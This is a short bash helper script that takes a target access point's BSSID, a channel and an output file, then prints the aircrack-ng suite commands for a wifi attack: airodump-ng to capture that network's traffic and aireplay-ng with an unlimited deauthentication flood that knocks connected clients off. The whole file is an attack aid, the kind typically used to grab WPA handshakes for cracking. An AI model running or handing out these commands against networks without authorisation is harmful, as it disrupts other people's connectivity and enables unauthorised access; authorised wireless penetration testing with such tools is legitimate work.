#!/bin/bash
bssid=""
chan=""
outfile=""
if [ $# != 3 ]; then
  echo Did you start mon0? \(airmon-ng start wlan0\)
  echo Did you dump all packets? \(airodump-ng mon0\)
  echo Usage: AircrackParsers \<bssid\> \<chan\> \<outfile\>
  exit
else
  bssid=$1
  chan=$2
  outfile=$3
fi

echo airodump-ng -c $chan -w $outfile --bssid $bssid mon0
echo aireplay-ng -0 0 -a $bssid mon0
